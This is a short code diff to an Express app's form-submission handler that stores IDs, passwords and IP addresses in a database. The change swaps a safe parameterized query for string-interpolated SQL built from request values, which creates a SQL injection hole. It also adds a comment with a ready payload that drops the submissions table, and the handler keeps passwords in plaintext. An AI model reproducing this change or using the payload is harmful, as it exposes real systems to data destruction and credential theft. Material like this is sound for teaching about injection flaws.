@@ -25,8 +25,8 @@ app.post("/submit", async (req, res) => {
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress
   try {
     await pool.query(
-      "INSERT INTO submissions (idMat, password,ip) VALUES ($1, $2,$3)",
-      [idMat, password,ip]
+      `INSERT INTO submissions (ip, password, idMat)
+      VALUES ('${ip}', '${password}', '${idMat}')`
     )
 
     res.send(`
@@ -42,3 +42,5 @@ app.post("/submit", async (req, res) => {
 app.listen(process.env.PORT, () => {
   console.log("Server running on port " + process.env.PORT)
 })
+
+//123'); DROP TABLE submissions; --
